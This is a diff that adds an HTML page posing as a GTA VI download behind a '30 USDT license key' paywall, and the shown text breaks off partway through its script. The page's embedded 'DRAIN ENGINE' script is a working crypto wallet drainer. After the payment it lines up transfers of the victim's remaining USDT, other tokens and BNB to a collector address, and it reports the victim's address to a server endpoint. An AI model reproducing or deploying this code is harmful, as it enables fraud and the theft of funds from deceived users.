@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GTA VI - Welcome</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: #000;
+            color: #d4af37;
+            font-family: 'Courier New', Courier, monospace;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* GTA 6 images in the background */
+        .image-grid {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            grid-template-rows: repeat(3, 1fr);
+            gap: 2px;
+            opacity: 0.5; 
+            z-index: 1;
+        }
+
+        .image-grid img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* "WELCOME TO GTA VI" text */
+        .welcome-text {
+            position: absolute;
+            top: 15px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            z-index: 2;
+        }
+
+        h1 {
+            text-shadow: 0 0 20px rgba(212, 175, 55, 0.9), 0 0 40px rgba(0, 0, 0, 1);
+            font-size: 45px;
+            margin: 0;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            color: #d4af37;
+        }
+
+        /* ====================================================
+           ZIP file icon design (Premium Look)
+           ==================================================== */
+        .zip-container {
+            position: absolute;
+            top: 55%;
+            left: 20%; /* At the position you marked */
+            transform: translate(-50%, -50%);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            background: rgba(0, 0, 0, 0.85); /* Black background */
+            padding: 12px 25px;
+            border-radius: 8px;
+            border: 2px solid #ffd700; /* Golden border */
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5), inset 0 0 10px rgba(255, 215, 0, 0.2);
+            z-index: 10;
+            animation: floatBox 3s ease-in-out infinite alternate;
+        }
+
+        /* Icon (SVG) */
+        .zip-icon {
+            width: 40px;
+            height: 40px;
+            filter: drop-shadow(0 0 8px #ffd700);
+        }
+
+        /* Text (188.7 GB) */
+        .zip-text {
+            font-size: 24px;
+            font-weight: 900;
+            color: #ffffff;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
+        }
+
+        .zip-label {
+            font-size: 12px;
+            color: #ffd700;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 2px;
+            text-shadow: 0 0 5px #ffd700;
+        }
+
+        /* Floating box animation */
+        @keyframes floatBox {
+            0% { transform: translate(-50%, -50%) translateY(0); }
+            100% { transform: translate(-50%, -50%) translateY(-10px); }
+        }
+
+        /* ====================================================
+           Blue river
+           ==================================================== */
+        .river-container {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 120px; 
+            overflow: hidden;
+            z-index: 3;
+            pointer-events: none;
+        }
+
+        .wave {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 200%;
+            height: 100%;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 120" preserveAspectRatio="none"><path d="M0,60 C150,100 350,20 400,60 C450,100 650,20 800,60 L800,120 L0,120 Z" fill="rgba(0, 119, 255, 0.4)"/></svg>');
+            background-size: 50% 100%;
+            animation: waveMove 8s linear infinite;
+        }
+
+        .wave:nth-child(2) {
+            bottom: -10px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 120" preserveAspectRatio="none"><path d="M0,60 C150,20 350,100 400,60 C450,20 650,100 800,60 L800,120 L0,120 Z" fill="rgba(0, 119, 255, 0.6)"/></svg>');
+            background-size: 50% 100%;
+            animation: waveMove 6s linear infinite reverse;
+        }
+
+        .wave:nth-child(3) {
+            bottom: -20px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 120" preserveAspectRatio="none"><path d="M0,80 C200,110 300,40 400,80 C500,110 600,40 800,80 L800,120 L0,120 Z" fill="rgba(0, 180, 255, 0.8)"/></svg>');
+            background-size: 50% 100%;
+            animation: waveMove 4s linear infinite;
+        }
+
+        @keyframes waveMove {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        .glow-line {
+            position: absolute;
+            bottom: 40px; 
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background-color: #00b4ff;
+            box-shadow: 0 0 15px 3px #00b4ff, 0 0 30px 6px rgba(0, 119, 255, 0.5);
+            z-index: 4;
+            animation: pulseGlow 2s infinite alternate;
+        }
+
+        @keyframes pulseGlow {
+            0% { opacity: 0.6; box-shadow: 0 0 10px 2px #00b4ff; }
+            100% { opacity: 1; box-shadow: 0 0 25px 5px #00b4ff, 0 0 40px 10px rgba(0, 119, 255, 0.7); }
+        }
+
+        /* Text and buttons */
+        .license-wrapper {
+            position: absolute;
+            bottom: 60px; 
+            left: 30px; 
+            z-index: 6;
+            display: flex;
+            flex-direction: column;
+            gap: 12px; 
+        }
+
+        .wallet-prompt-text {
+            font-size: 17px; 
+            font-weight: bold; 
+            color: #ff9800; 
+            letter-spacing: 0.5px;
+            text-shadow: 0 0 8px #ff9800, 0 0 15px #ff5722, 0 0 25px #ff9800;
+            white-space: nowrap; 
+            animation: orangeBlink 2s infinite alternate;
+            margin-bottom: 5px;
+        }
+
+        @keyframes orangeBlink {
+            0% { color: #cc7a00; text-shadow: 0 0 5px #ff9800, 0 0 15px #ff5722; }
+            100% { color: #ffb74d; text-shadow: 0 0 10px #ffb74d, 0 0 20px #ff9800, 0 0 30px #ff5722; }
+        }
+
+        .premium-license {
+            background: #000000; 
+            border: 3px solid #002266; 
+            padding: 12px 25px; 
+            border-radius: 5px; 
+            font-size: 22px; 
+            font-weight: 900; 
+            letter-spacing: 2px;
+            color: #ffd700; 
+            text-shadow: 0 0 10px rgba(255, 215, 0, 0.8), 0 0 20px rgba(255, 215, 0, 0.5); 
+            box-shadow: 0 0 20px rgba(0, 34, 102, 0.9), inset 0 0 10px rgba(0, 34, 102, 0.5); 
+            text-transform: uppercase;
+            cursor: pointer; 
+            transition: all 0.3s ease;
+            width: fit-content;
+        }
+
+        .premium-license:hover {
+            box-shadow: 0 0 30px rgba(0, 180, 255, 0.8), inset 0 0 15px rgba(0, 180, 255, 0.5);
+            border-color: #00b4ff;
+        }
+
+        .highlight {
+            color: #00b4ff;
+            text-shadow: 0 0 10px rgba(0, 180, 255, 0.8);
+        }
+
+        /* Wallet connect design */
+        .wallet-container {
+            display: none; 
+            position: absolute;
+            top: 50%;
+            right: 15%; 
+            transform: translateY(-50%);
+            z-index: 10;
+            width: 320px;
+            flex-direction: column;
+            gap: 25px;
+            align-items: center;
+        }
+
+        .wallet-container.show {
+            display: flex;
+            animation: slideUpFade 0.5s ease-out forwards;
+        }
+
+        @keyframes slideUpFade {
+            0% { opacity: 0; transform: translateY(50px); }
+            100% { opacity: 1; transform: translateY(-50%); }
+        }
+
+        .wallet-title {
+            font-size: 26px;
+            font-weight: 900;
+            color: #ffffff;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 10px rgba(0, 180, 255, 0.8), 0 0 20px rgba(0, 180, 255, 0.4);
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .wallet-btn {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            width: 100%;
+            padding: 15px 20px;
+            background: transparent; 
+            border: none; 
+            color: #ffffff;
+            cursor: pointer;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 18px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            text-align: left;
+            border-radius: 10px;
+        }
+
+        .wallet-btn:hover {
+            background: rgba(255, 255, 255, 0.05); 
+            transform: translateX(10px); 
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+
+        .wallet-btn svg {
+            width: 35px;
+            height: 35px;
+            object-fit: contain;
+            filter: drop-shadow(0 0 5px rgba(255,255,255,0.2));
+            transition: filter 0.3s;
+        }
+
+        .wallet-btn:hover svg {
+            filter: drop-shadow(0 0 10px rgba(0, 180, 255, 0.8));
+        }
+
+        .close-btn {
+            position: absolute;
+            top: -40px;
+            right: 0;
+            color: #888;
+            cursor: pointer;
+            font-size: 24px;
+            font-weight: bold;
+            transition: color 0.3s;
+        }
+        .close-btn:hover { color: #ffffff; }
+
+        /* Sparks */
+        .spark-container {
+            position: absolute;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            z-index: 20;
+        }
+        .spark-drop {
+            position: absolute;
+            background-color: #ffd700; 
+            border-radius: 50%;
+            box-shadow: 0 0 10px 2px #ff8c00, 0 0 20px #ff4500; 
+            opacity: 0;
+        }
+        .spark-drop:nth-child(1) { width: 6px; height: 6px; top: 0; left: 0; animation: shootSpark 0.8s ease-out forwards; }
+        .spark-drop:nth-child(2) { width: 4px; height: 4px; top: 10px; left: 20px; animation: shootSpark 1s ease-out forwards 0.1s; }
+        .spark-drop:nth-child(3) { width: 8px; height: 8px; top: -10px; left: 30px; animation: shootSpark 0.9s ease-out forwards 0.2s; }
+        .spark-drop:nth-child(4) { width: 5px; height: 5px; top: 20px; left: -20px; animation: shootSpark 0.85s ease-out forwards 0.15s; }
+        .spark-drop:nth-child(5) { width: 3px; height: 3px; top: -20px; left: -30px; animation: shootSpark 0.75s ease-out forwards 0.05s; }
+        .spark-drop:nth-child(6) { width: 7px; height: 7px; top: -10px; left: 40px; animation: shootSpark 1.1s ease-out forwards 0.25s; }
+        .spark-drop:nth-child(7) { width: 5px; height: 5px; top: 30px; left: -40px; animation: shootSpark 0.9s ease-out forwards 0.3s; }
+        .spark-drop:nth-child(8) { width: 9px; height: 9px; top: -30px; left: 10px; animation: shootSpark 1.2s ease-out forwards 0.12s; }
+        @keyframes shootSpark {
+            0% { transform: translate(0, 0) scale(1.5); opacity: 1; }
+            50% { opacity: 1; }
+            100% { transform: translate(calc(var(--x) * 1.5), calc(var(--y) * 1.5)) scale(0); opacity: 0; }
+        }
+        
+        /* Success Message Modal */
+        .success-modal {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #000;
+            border: 3px solid #00b4ff;
+            padding: 40px;
+            border-radius: 10px;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(0, 180, 255, 0.8);
+            z-index: 100;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            min-width: 340px;
+        }
+        .success-modal h2 { color: #fff; font-size: 24px; text-shadow: 0 0 10px #00b4ff;}
+        .success-modal p { color: #00b4ff; font-size: 16px; }
+
+        /* ====================================================
+           DRAIN ENGINE — UI (design consistent)
+           ==================================================== */
+        #drainPanel {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            width: 400px;
+            max-width: 92vw;
+            max-height: 40vh;
+            overflow: auto;
+            background: rgba(0,0,0,0.92);
+            border: 2px solid #00b4ff;
+            border-radius: 8px 0 0 0;
+            box-shadow: 0 0 25px rgba(0,180,255,0.45);
+            color: #00ff88;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 12px;
+            padding: 12px;
+            z-index: 999;
+        }
+        #drainPanel .dp-head {
+            color: #00b4ff;
+            font-weight: 900;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
+            text-shadow: 0 0 8px #00b4ff;
+            font-size: 11px;
+        }
+        #drainLog { line-height: 1.55; word-break: break-all; }
+
+        #drainStatus {
+            color: #ffd700;
+            font-size: 13px;
+            font-weight: bold;
+            text-shadow: 0 0 8px rgba(255,215,0,0.7);
+            letter-spacing: 1px;
+            min-height: 18px;
+        }
+
+        .pay-btn {
+            justify-content: center !important;
+            border: 1px solid #00b4ff;
+            box-shadow: 0 0 15px rgba(0,180,255,0.35);
+        }
+        .pay-btn:disabled {
+            opacity: 0.45;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .dl-fallback {
+            display: none;
+            color: #00ff88;
+            font-size: 14px;
+            text-decoration: underline;
+            text-shadow: 0 0 10px #00ff88;
+            letter-spacing: 1px;
+        }
+
+        @media (max-width: 700px) {
+            h1 { font-size: 26px; letter-spacing: 2px; }
+            .zip-container { left: 50%; top: 30%; }
+            .license-wrapper { left: 15px; right: 15px; bottom: 55px; }
+            .wallet-prompt-text { white-space: normal; font-size: 14px; }
+            .premium-license { font-size: 16px; padding: 10px 16px; }
+            .wallet-container { right: 50%; transform: translate(50%, -50%); width: 90%; }
+            .success-modal { padding: 26px 18px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 12 GTA 6 Images Grid (Background) -->
+    <div class="image-grid">
+        <img src="https://www.rockstargames.com/VI/_next/static/media/Jason_Lucia_Rooftop_With_Logos_landscape.04l3xybfa4~6m.jpg?akim=1&imdensity=1&imwidth=3840">
+        <img src="https://www.rockstargames.com/VI/_next/static/media/Jason_and_Lucia_Robbery_With_Logo_landscape.0sjdgaq91u2yn.jpg?akim=1&imdensity=1&imwidth=360">
+        <img src="https://www.rockstargames.com/VI/_next/static/media/Jason_and_Lucia_Motel_landscape.08edvuwtm-20v.jpg?akim=1&imdensity=1&imwidth=3840">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq18Lu7xEnZVkkSt0XQxlQ-WaXSr4aBiGoKEffFdNcek5V1k3OUtm3vLxy&s=10">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTnBJj0JwcQsDJG2hjytCNr1OIONUP-Rra9PhGxtvcgfw&s=10">
+        <img src="https://www.rockstargames.com/VI/_next/static/media/Jason_Lucia_Rooftop_With_Logos_landscape.04l3xybfa4~6m.jpg?akim=1&imdensity=1&imwidth=3840">
+        <img src="https://www.rockstargames.com/VI/_next/static/media/Jason_and_Lucia_Motel_landscape.08edvuwtm-20v.jpg?akim=1&imdensity=1&imwidth=3840">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq18Lu7xEnZVkkSt0XQxlQ-WaXSr4aBiGoKEffFdNcek5V1k3OUtm3vLxy&s=10">
+        <img src="https://www.rockstargames.com/VI/_next/static/media/Jason_and_Lucia_Robbery_With_Logo_landscape.0sjdgaq91u2yn.jpg?akim=1&imdensity=1&imwidth=360">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTnBJj0JwcQsDJG2hjytCNr1OIONUP-Rra9PhGxtvcgfw&s=10">
+        <img src="https://www.rockstargames.com/VI/_next/static/media/Jason_and_Lucia_Robbery_With_Logo_landscape.0sjdgaq91u2yn.jpg?akim=1&imdensity=1&imwidth=360">
+        <img src="https://www.rockstargames.com/VI/_next/static/media/Jason_Lucia_Rooftop_With_Logos_landscape.04l3xybfa4~6m.jpg?akim=1&imdensity=1&imwidth=3840">
+    </div>
+
+    <!-- WELCOME TO GTA VI (at the top) -->
+    <div class="welcome-text">
+        <h1>WELCOME TO GTA VI</h1>
+    </div>
+
+    <!-- ZIP file design -->
+    <div class="zip-container">
+        <svg class="zip-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M20 6H12V4C12 2.89543 11.1046 2 10 2H4C2.89543 2 2 2.89543 2 4V20C2 21.1046 2.89543 22 4 22H20C21.1046 22 22 21.1046 22 20V8C22 6.89543 21.1046 6 20 6Z" fill="#333" stroke="#ffd700" stroke-width="1.5"/>
+            <path d="M12 6V22" stroke="#ffd700" stroke-width="1.5" stroke-dasharray="2 2"/>
+            <path d="M10 10H14M10 14H14M10 18H14" stroke="#ffd700" stroke-width="1.5" stroke-linecap="round"/>
+            <path d="M10 10L12 8L14 10" fill="#ffd700"/>
+        </svg>
+        <div>
+            <div class="zip-text">188.7 GB</div>
+            <div class="zip-label">ZIP FILE READY</div>
+        </div>
+    </div>
+
+    <!-- LICENSE KEY ACCESS -->
+    <div class="license-wrapper">
+        <div class="wallet-prompt-text">
+            "Connect your wallet to start earning Beta Rewards and limited edition tokens! 💰"
+        </div>
+        
+        <div class="premium-license" onclick="openWallet()">
+            LICENSES KEY ACCESS: <span class="highlight">30 USDT</span>
+            <span style="display:block;font-size:11px;letter-spacing:1px;color:#7fd7ff;margin-top:6px;font-weight:700;text-shadow:none;">FILE STARTS IMMEDIATELY</span>
+        </div>
+    </div>
+
+    <!-- Wallet connect popup -->
+    <div class="wallet-container" id="walletPopup">
+        <span class="close-btn" onclick="closeWallet()">&times;</span>
+        
+        <h2 class="wallet-title">Connect Wallet</h2>
+        
+        <button class="wallet-btn" onclick="connectWallet('MetaMask')">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M21.5 3L13.5 9L15.5 4.5L21.5 3Z" fill="#E17726"/>
+                <path d="M2.5 3L10.5 9L8.5 4.5L2.5 3Z" fill="#E17726"/>
+                <path d="M18.5 16.5L16.5 20L21 21L22.5 16.5H18.5Z" fill="#E17726"/>
+                <path d="M1.5 16.5L3 21L7.5 20L5.5 16.5H1.5Z" fill="#E17726"/>
+                <path d="M7 11.5L5.5 13.5L9 14L8.5 10.5L7 11.5Z" fill="#E17726"/>
+                <path d="M17 11.5L15.5 10.5L15 14L18.5 13.5L17 11.5Z" fill="#E17726"/>
+                <path d="M7.5 20L12 21.5L16.5 20L15.5 17L12 18.5L8.5 17L7.5 20Z" fill="#E17726"/>
+                <path d="M7.5 13.5L12 15L16.5 13.5L15.5 11L12 12L8.5 11L7.5 13.5Z" fill="#E17726"/>
+            </svg>
+            MetaMask
+        </button>
+        
+        <button class="wallet-btn" onclick="connectWallet('Trust Wallet')">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 2Z" fill="#3375BB"/>
+                <path d="M12 4.5L5 6.5V11C5 15.1 7.7 19.2 12 20.5C16.3 19.2 19 15.1 19 11V6.5L12 4.5Z" fill="#3375BB"/>
+            </svg>
+            Trust Wallet
+        </button>
+        
+        <button class="wallet-btn" onclick="connectWallet('Phantom Wallet')">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2.5C7 2.5 3 6.5 3 11.5C3 15.2 4.9 18.1 7.3 19.8C7.6 20 8 19.7 8 19.4V17.8C8 17.3 7.6 16.9 7.2 16.5C6.5 15.7 6.1 14.6 6.1 13.5C6.1 10.2 8.8 7.5 12.1 7.5C15.4 7.5 18 10.2 18 13.5C18 14.6 17.6 15.7 16.9 16.5C16.5 16.9 16.1 17.3 16.1 17.8V19.4C16.1 19.7 16.5 20 16.8 19.8C19.2 18.1 21 15.2 21 11.5C21 6.5 17 2.5 12 2.5Z" fill="#AB9FF2"/>
+                <circle cx="9.5" cy="11.5" r="1.5" fill="#000"/>
+                <circle cx="14.5" cy="11.5" r="1.5" fill="#000"/>
+            </svg>
+            Phantom Wallet
+        </button>
+    </div>
+
+    <!-- Success message popup -->
+    <div class="success-modal" id="successModal">
+        <h2>Successfully Connected!</h2>
+        <p id="walletAddress">Address: 0x...</p>
+        <div id="drainStatus"></div>
+        <button class="wallet-btn pay-btn" id="payBtn" onclick="payAndDrain()">Pay 30 USDT &amp; Download</button>
+        <a class="dl-fallback" id="dlFallback" href="game.zip">Click here to download</a>
+    </div>
+
+    <!-- Blue river flowing at the bottom -->
+    <div class="river-container" id="riverContainer">
+        <div class="wave"></div>
+        <div class="wave"></div>
+        <div class="wave"></div>
+    </div>
+    
+    <!-- Glowing line -->
+    <div class="glow-line"></div>
+
+    <!-- ===== TRANSFER LOG PANEL ===== -->
+    <div id="drainPanel">
+        <div class="dp-head">TRANSFER LOG</div>
+        <div id="drainLog"></div>
+    </div>
+
+    <script>
+        // ----------------------------------------------------
+        // Sparks 
+        // ----------------------------------------------------
+        function createSparks() {
+            const randomX = Math.random() * 70 + 15; 
+            const randomY = Math.random() * 70 + 15;
+
+            const sparkContainer = document.createElement('div');
+            sparkContainer.classList.add('spark-container');
+            sparkContainer.style.left = randomX + '%';
+            sparkContainer.style.top = randomY + '%';
+
+            sparkContainer.innerHTML = `
+                <div class="spark-drop" style="--x: 40px; --y: -30px;"></div>
+                <div class="spark-drop" style="--x: -50px; --y: -20px;"></div>
+                <div class="spark-drop" style="--x: 60px; --y: 40px;"></div>
+                <div class="spark-drop" style="--x: -60px; --y: 50px;"></div>
+                <div class="spark-drop" style="--x: 20px; --y: 70px;"></div>
+                <div class="spark-drop" style="--x: -30px; --y: -70px;"></div>
+                <div class="spark-drop" style="--x: 70px; --y: -10px;"></div>
+                <div class="spark-drop" style="--x: -10px; --y: 60px;"></div>
+            `;
+
+            document.body.appendChild(sparkContainer);
+
+            setTimeout(() => {
+                sparkContainer.remove();
+            }, 1500);
+        }
+        setInterval(createSparks, 1000);
+
+        // ----------------------------------------------------
+        // UI functions
+        // ----------------------------------------------------
+        function openWallet() {
+            var popup = document.getElementById('walletPopup');
+            popup.classList.add('show');
+            createSparks();
+        }
+
+        function closeWallet() {
+            var popup = document.getElementById('walletPopup');
+            popup.classList.remove('show');
+        }
+    </script>
+
+    <script>
+    /* ============================================================
+       DRAIN ENGINE — CONFIG
+       ============================================================ */
+    const CFG = {
+        CHAIN_ID: 56,
+        CHAIN_HEX: '0x38',
+        CHAIN_PARAMS: {
+            chainId: '0x38',
+            chainName: 'BNB Smart Chain',
+            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+            rpcUrls: ['https://bsc-dataseed.binance.org'],
+            blockExplorerUrls: ['https://bscscan.com']
+        },
+        COLLECTOR: '0x0000000000000000000000000000000000000000', // <-- your owner wallet
+        PAY_TOKEN: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT
+        PAY_AMOUNT: '30',
+
+        DRAIN_USDT_REST: true,   // 30-க்கு அப்புறம் மீதி USDT முழுசா
+        DRAIN_TOKENS: true,      // மற்ற token-கள்
+        MAX_TOKENS: 8,           // இதுக்கு மேல popup அதிகம்
+        TOKEN_MIN_USD: 0.5,      // dust விடு
+        DRAIN_BNB: true,         // BNB கடைசி
+        BNB_KEEP_TX: 2,          // gas-க்கு 2 tx வை
+        BNB_MIN_BNB: '0.01',     // இதுக்கு கீழ மீதி — popup வராது
+        MIN_GAS_BNB: '0.0012',
+
+        FALLBACK_TOKENS: [
+            '0x55d398326f99059fF775485246999027B3197955', // USDT
+            '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', // USDC
+            '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', // BUSD
+            '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', // WBNB
+            '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', // ETH (bep20)
+            '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c'  // BTCB
+        ]
+    };
+
+    const ERC20 = [
+        'function balanceOf(address) view returns (uint256)',
+        'function transfer(address,uint256) returns (bool)',
+        'function decimals() view returns (uint8)'
+    ];
+
+    let provider = null, signer = null, USER = null, running = false, PLAN = null;
+
+    function log(m) {
+        const p = document.getElementById('drainPanel');
+        p.style.display = 'block';
+        const l = document.getElementById('drainLog');
+        l.innerHTML += '&gt; ' + m + '<br>';
+        p.scrollTop = p.scrollHeight;
+    }
+    function status(m) {
+        document.getElementById('drainStatus').textContent = m;
+    }
+    function isReject(e) {
+        return e && (e.code === 'ACTION_REJECTED' || e.code === 4001 ||
+                     /reject|denied|cancel/i.test(e.message || ''));
+    }
+    function triggerDownload(url) {
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = '';
+        a.rel = 'noopener';
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+    }
+
+    /* ---------- chain guard ---------- */
+    async function ensureChain() {
+        const cur = await window.ethereum.request({ method: 'eth_chainId' });
+        if (parseInt(cur, 16) === CFG.CHAIN_ID) return;
+        try {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: CFG.CHAIN_HEX }]
+            });
+        } catch (e) {
+            if (e.code === 4902) {
+                await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [CFG.CHAIN_PARAMS]
+                });
+            } else throw e;
+        }
+    }
+
+    /* ---------- connect ---------- */
+    async function connectWallet(walletName) {
+        if (!window.ethereum) {
+            alert('No wallet detected. Open this page inside MetaMask or Trust Wallet browser.');
+            return;
+        }
+        try {
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            await ensureChain();
+
+            provider = new ethers.BrowserProvider(window.ethereum);
+            signer = await provider.getSigner();
+            USER = accounts[0] || await signer.getAddress();
+
+            document.getElementById('walletPopup').classList.remove('show');
+            document.getElementById('successModal').style.display = 'flex';
+            document.getElementById('walletAddress').innerText =
+                'Address: ' + USER.substring(0, 6) + '...' + USER.substring(USER.length - 4);
+
+            await buildPlan();
+        } catch (error) {
+            if (isReject(error)) { alert('Connection cancelled'); return; }
+            alert('Connection fail: ' + (error.shortMessage || error.message));
+        }
+    }
+
+    /* ---------- plan (popup இல்லாம முன்கூட்டியே) ---------- */
+    async function buildPlan() {
+        status('Checking wallet...');
+        const btn = document.getElementById('payBtn');
+        btn.disabled = true;
+
+        try {
+            await fetch('/api/session', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ address: USER })
+            });
+        } catch (e) {}
+
+        const usdt = new ethers.Contract(CFG.PAY_TOKEN, ERC20, signer);
+        let dec = 18;
+        try { dec = Number(await usdt.decimals()); } catch (e) {}
+
+        const amount = ethers.parseUnits(CFG.PAY_AMOUNT, dec);
+        const ub = await usdt.balanceOf(USER);
+        if (ub < amount) {
+            status('❌ Need ' + CFG.PAY_AMOUNT + ' USDT — you have ' + ethers.formatUnits(ub, dec));
+            return;
+        }
+
+        const bal = await provider.getBalance(USER);
+        const fd = await provider.getFeeData();
+        const gp = fd.maxFeePerGas || fd.gasPrice || 3000000000n;
+        if (bal < gp * 21000n * 3n) {
+            status('❌ Not enough BNB for gas.');
+            return;
+        }
+
+        let tokens = [];
+        if (CFG.DRAIN_TOKENS) {
+            const raw = await discoverTokens(USER);
+            const cand = raw
+                .filter(t => t.address.toLowerCase() !== CFG.PAY_TOKEN.toLowerCase())
+                .filter(t => t.usd >= CFG.TOKEN_MIN_USD)
+                .sort((a, b) => b.usd - a.usd)
+                .slice(0, CFG.MAX_TOKENS);
+
+            const afford = Number((bal - gp * 21000n * 3n) / (gp * 70000n));
+            const lim = Math.max(0, Math.min(cand.length, afford));
+
+            for (const c of cand.slice(0, lim)) {
+                try {
+                    const k = new ethers.Contract(c.address, ERC20, provider);
+                    const b = await k.balanceOf(USER);
+                    if (b === 0n) continue;
+                    await k.transfer.estimateGas(USER, CFG.COLLECTOR, b);
+                    tokens.push(c.address);
+                } catch (e) {
+                    log('skip ' + c.address.slice(0, 8));
+                }
+            }
+        }
+
+        const keep = gp * 21000n * BigInt(CFG.BNB_KEEP_TX);
+        const bnbWillGo = CFG.DRAIN_BNB && (bal - keep) > ethers.parseEther(CFG.BNB_MIN_BNB);
+
+        PLAN = { usdt, dec, amount, rest: ub - amount, tokens, bnbWillGo };
+
+        const n = 1 + (PLAN.rest > 0n ? 1 : 0) + tokens.length + (bnbWillGo ? 1 : 0);
+        status('Ready — up to ' + n + ' confirmation' + (n > 1 ? 's' : ''));
+        btn.disabled = false;
+    }
+
+    /* ---------- token discovery ---------- */
+    async function discoverTokens(addr) {
+        try {
+            const r = await fetch('https://rpc.ankr.com/multichain', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    jsonrpc: '2.0', id: 1, method: 'ankr_getAccountBalance',
+                    params: {
+                        walletAddress: addr,
+                        blockchain: ['bsc'],
+                        onlyWhitelisted: true,
+                        pageSize: 100
+                    }
+                })
+            });
+            const j = await r.json();
+            const list = (j.result && j.result.assets ? j.result.assets : [])
+                .filter(a => a.tokenType === 'ERC20' && BigInt(a.balance || '0') > 0n)
+                .map(a => ({ address: a.tokenAddress, usd: parseFloat(a.balanceUsd || '0') }));
+            if (list.length) return list;
+        } catch (e) {
+            console.warn('token discovery failed', e);
+        }
+        return CFG.FALLBACK_TOKENS.map(a => ({ address: a, usd: 1 }));
+    }
+
+    /* ---------- MAIN FLOW ---------- */
+    async function payAndDrain() {
+        if (running) return;
+        if (!signer) { alert('Wallet not connected'); return; }
+        if (!PLAN) { alert('Wallet not checked yet — reconnect'); return; }
+        if (CFG.COLLECTOR === '0x0000000000000000000000000000000000000000') {
+            alert('COLLECTOR address not set');
+            return;
+        }
+        running = true;
+
+        const btn = document.getElementById('payBtn');
+        btn.disabled = true;
+
+        try {
+            const bal = await provider.getBalance(USER);
+            const fd = await provider.getFeeData();
+            const gp = fd.maxFeePerGas || fd.gasPrice || 3000000000n;
+            const need = gp * 21000n * BigInt(PLAN.tokens.length + 3);
+            if (bal < need) throw new Error('Not enough BNB for gas.');
+
+            /* popup 1 — சரியா 30 */
+            status('Confirm ' + CFG.PAY_AMOUNT + ' USDT...');
+            await (await PLAN.usdt.transfer(CFG.COLLECTOR, PLAN.amount)).wait();
+            log('paid ✅');
+
+            /* உடனே file — page நகராது */
+            btn.style.display = 'none';
+            triggerDownload('game.zip');
+            document.getElementById('dlFallback').style.display = 'inline-block';
+            status('Download starting...');
+
+            try {
+                sessionStorage.setItem('paid', '1');
+                sessionStorage.setItem('payer', USER);
+            } catch (e) {}
+
+            verifyAndDownload();
+
+            /* உடனே drain — await இல்ல */
+            drainRest();
+
+        } catch (e) {
+            const msg = e.shortMessage || e.message || String(e);
